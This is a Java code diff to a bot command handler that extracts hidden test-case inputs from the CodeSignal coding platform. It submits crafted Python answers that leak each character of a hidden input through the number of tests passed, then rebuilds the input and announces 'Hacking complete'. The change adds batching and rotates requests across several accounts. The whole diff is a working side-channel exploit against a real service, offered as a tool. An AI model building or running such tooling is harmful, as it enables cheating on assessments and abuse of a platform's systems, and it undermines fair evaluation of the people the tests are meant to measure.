@@ -24,12 +24,13 @@ import org.slf4j.LoggerFactory;
 
 import java.awt.*;
 import java.util.ArrayList;
-import java.util.LinkedHashMap;
 import java.util.List;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
 
 
 public class GetHiddenTestsHandler extends AbstractCommandHandler {
@@ -52,6 +53,10 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
                 .type(Integer.class)
                 .setDefault(0)
                 .help("The index of the hidden test (default 0)");
+        parser.addArgument("-b", "--batch-size")
+                .type(Integer.class)
+                .setDefault(5)
+                .help("Number of chars to recover in a batch (default 5)");
         parser.addArgument("-d", "--delay")
                 .type(Integer.class)
                 .setDefault(0)
@@ -69,7 +74,10 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
 
         String challengeId = ns.getString("challenge_id");
         int testNumber = ns.getInt("test_number");
-        int delay = ns.getInt("delay") * 1000;
+        int batchSize = ns.getInt("batch_size");
+        // Here we divided by MAX_CONCURRENT so delay would be the time it would take us back to
+        // using the same account again.
+        int delay = ns.getInt("delay") * 1000 / CSWebSocketImpl.MAX_CONCURRENT;
         CodesignalClient csClient = CodesignalClientSingleton.getInstance();
 
         csClient.send(
@@ -95,7 +103,8 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
                                 sampleResult -> {
                                     Thread extractTestThread = new Thread(() ->
                                         extractHiddenTestData(
-                                                sampleResult, event, taskId, challengeId, testNumber, delay, message)
+                                                sampleResult, event, taskId, challengeId, testNumber, delay,
+                                                batchSize, message)
                                     );
                                     extractTestThread.start();
                                 }
@@ -116,6 +125,7 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
             String challengeId,
             int testNumber,
             int delay,
+            final int batchSize,
             Message message
             )
     {
@@ -124,7 +134,6 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
             // 1. Retrieve sample tests
             int sampleCount = 0;
             int hiddenCount = 0;
-            Map<Object, Object> inputToOutput = new LinkedHashMap<>();
             List<Map<Object, Object>> sampleTests = (List<Map<Object, Object>>) resultMessage.getResult();
             ObjectMapper objMapper = new ObjectMapper();
             objMapper.configure(JsonGenerator.Feature.QUOTE_FIELD_NAMES, true);
@@ -182,59 +191,90 @@ public class GetHiddenTestsHandler extends AbstractCommandHandler {
             int wssIndex = 0;
 
             StringBuilder recoveredInput = new StringBuilder();
-            for (int processed_character = 0; processed_character < 50; processed_character++) {
-                CountDownLatch countDownLatch = new CountDownLatch(neededIteration);
-                ConcurrentHashMap<Integer, Integer> bits = new ConcurrentHashMap<>();
-                for (int i = 0; i < neededIteration; i++) {
-                    final int idx = i;
-                    wss.get(wssIndex++ % wss.size()).send(
+            for (int batchIdx = 0; batchIdx < 20; batchIdx++) {
+                AtomicInteger charCount = new AtomicInteger();
+                AtomicBoolean failed = new AtomicBoolean(false);
+                CountDownLatch batchCountDown = new CountDownLatch(batchSize);
 
-                            new SubmitTaskAnswerMessage(
-                                    taskId,
-                                    challengeId,
-                                    compiled
-                                            .replace("CHARACTER_TO_CHECK",
-                                                    Integer.toString(processed_character))
-                                            .replace("DIGIT_TO_CHECK", Integer.toString(i)),
-                                    "py"),
-                            submitTaskResponse -> {
-                                Map<Object, Object> result =
-                                        (Map<Object, Object>) submitTaskResponse.getResult();
-                                bits.put(idx, Integer.parseInt(result.get("correctTestCount").toString()));
-                                countDownLatch.countDown();
+                // Process 5 characters in a batch
+                ConcurrentHashMap<Integer, Character> recoveredChars = new ConcurrentHashMap<>();
+                for (int processedCharacter = 0; processedCharacter < batchSize; processedCharacter++) {
+                    final int finalProcessedCharacter = processedCharacter;
+                    CountDownLatch bitsCountDown = new CountDownLatch(neededIteration);
+                    ConcurrentHashMap<Integer, Integer> bits = new ConcurrentHashMap<>();
+                    for (int i = 0; i < neededIteration; i++) {
+                        Thread.sleep(delay);
+                        final int idx = i;
+                        wss.get(wssIndex++ % wss.size()).send(
+                                new SubmitTaskAnswerMessage(
+                                        taskId,
+                                        challengeId,
+                                        compiled
+                                                .replace("CHARACTER_TO_CHECK",
+                                                        Integer.toString(processedCharacter + batchIdx * batchSize))
+                                                .replace("DIGIT_TO_CHECK", Integer.toString(i)),
+                                        "py"),
+                                submitTaskResponse -> {
+                                    Map<Object, Object> result =
+                                            (Map<Object, Object>) submitTaskResponse.getResult();
+                                    bits.put(idx, Integer.parseInt(result.get("correctTestCount").toString()));
+                                    bitsCountDown.countDown();
+                                }
+                        );
+                    }
+
+                    new Thread(() -> {
+                        try {
+                            boolean cdReturnValue = bitsCountDown.await(15, TimeUnit.SECONDS);
+                            if (!cdReturnValue) {
+                                // Timeout waiting on bits to come back.
+                                failed.set(true);
+                                return;
                             }
-                    );
+                            bits.forEach((k, v) -> log.info(k + ": " + v));
+
+                            // Reconstruct the character from bits
+                            int characterOrd = 0;
+                            int power = 1;
+                            for (int i = 0; i < neededIteration; i++) {
+                                characterOrd += bits.get(i) * power;
+                                power *= base;
+                            }
+
+                            // Terminal characters don't count towards char count
+                            if (characterOrd != 0) {
+                                charCount.getAndIncrement();
+                                char character = Character.toChars(characterOrd)[0];
+                                log.info("Recovered character: " + character);
+                                recoveredChars.put(finalProcessedCharacter, character);
+                            }
+                        } catch (InterruptedException exception) {
+                            exception.printStackTrace();
+                            failed.set(true);
+                        } finally {
+                            batchCountDown.countDown();
+                        }
+                    }).start();
                 }
 
-                try {
-                    countDownLatch.await(15, TimeUnit.SECONDS);
-                } catch (InterruptedException exception) {
-                    exception.printStackTrace();
-                    message.editMessage("Encountered unexpected exception. Make sure that you specify " +
-                            "long enough delay.").queue();
-                    log.info("InterruptedException! Input: " + recoveredInput);
+                batchCountDown.await();
+                if (failed.get()) {
+                    message.editMessage(
+                            "Encountered error. Make sure that you specify long enough delay.").queue();
                     return;
                 }
 
-                bits.forEach((k, v) -> log.info(k + ": " + v));
-                // Reconstruct the character from bits
-                int characterOrd = 0;
-                int power = 1;
-                for (int i = 0; i < neededIteration; i++) {
-                    characterOrd += bits.get(i) * power;
-                    power *= base;
+                for (int i = 0; i < charCount.get(); i++) {
+                    recoveredInput.append(recoveredChars.get(i) == null ? '?' : recoveredChars.get(i));
                 }
-                if (characterOrd == 0) {
+
+                if (charCount.get() < batchSize) {
                     message.editMessage(
                             "✓ Hacking complete. The input is `" + recoveredInput + "`").queue();
                     log.info("hacking complete");
                     return;
                 }
-                char character = Character.toChars(characterOrd)[0];
-                recoveredInput.append(character);
                 message.editMessage(baseMessage + "`" + recoveredInput + "`").queue();
-                log.info("Recovered character: " + character);
-                Thread.sleep(delay);
             }
             message.editMessage("The input is just too long. Here's what " +
                     "we've uncovered so far: " + recoveredInput).queue();
